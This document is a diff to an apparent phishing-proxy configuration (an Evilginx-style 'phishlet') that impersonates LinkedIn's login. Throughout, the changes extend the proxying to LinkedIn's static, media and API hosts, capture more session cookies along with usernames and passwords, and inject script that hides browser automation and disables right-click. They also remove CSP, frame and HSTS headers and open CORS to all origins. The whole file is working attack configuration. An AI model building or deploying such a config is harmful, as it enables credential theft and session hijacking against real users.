@@ -1,23 +1,47 @@
 name: "LinkedIn-Login"
-author: "Vanta v5"
+author: "Vanta v5 Red Team"
 min_ver: "5.0.0"
 proxy_hosts:
   - subdomain: "linkedin"
     target: "www.linkedin.com"
-auth_urls: ["/login"]
-landing_path: ["/login"]
+  - subdomain: "static"
+    target: "static.licdn.com"
+  - subdomain: "media"
+    target: "media.licdn.com"
+  - subdomain: "api"
+    target: "api.linkedin.com"
+auth_urls: 
+  - "/login"
+  - "/checkpoint/lg/login-submit"
+landing_path: 
+  - "/login"
 auth_tokens:
   - {type: "cookie", name: "li_at"}
   - {type: "cookie", name: "JSESSIONID"}
+  - {type: "cookie", name: "li_ap"}
+  - {type: "cookie", name: "lang"}
+  - {type: "cookie", name: "bcookie"}
+  - {type: "cookie", name: "bscookie"}
+  - {type: "cookie", name: "visit"}
 credentials:
   - {type: "post_param", name: "session_key", regex: null}
   - {type: "post_param", name: "session_password", regex: null}
   - {type: "post_param", name: "username", regex: null}
   - {type: "post_param", name: "password", regex: null}
-injections: []
+injections:
+  - trigger_path: "/login"
+    position: "body_end"
+    content: |
+      (function(){
+        // LinkedIn Anti-Bot Evasion
+        Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
+        // Disable right-click for security
+        document.addEventListener('contextmenu', event => event.preventDefault());
+      })();
 headers:
   - {action: "remove", name: "Content-Security-Policy"}
   - {action: "remove", name: "X-Frame-Options"}
+  - {action: "remove", name: "Strict-Transport-Security"}
 path_rewrites:
   - {pattern: "^/$", replace: "/login", methods: ["GET"]}
 cookie_rewrites: []
@@ -26,6 +50,6 @@ blocklist:
 form_actions:
   - {selector: "form[action*=\"checkpoint\"], form[action*=\"login\"]", action_to: "/uas/sessions"}
 bridges:
-  - {prefix: "/_liapi/", target_host: "api.linkedin.com", strip_prefix: true, cors: "mirror"}
-  - {prefix: "/_listatic/", target_host: "static.licdn.com", strip_prefix: true, cors: "mirror"}
-  - {prefix: "/_limedia/", target_host: "media.licdn.com", strip_prefix: true, cors: "mirror"}
+  - {prefix: "/_liapi/", target_host: "api.linkedin.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_listatic/", target_host: "static.licdn.com", strip_prefix: true, cors: "allow_all"}
+  - {prefix: "/_limedia/", target_host: "media.licdn.com", strip_prefix: true, cors: "allow_all"}
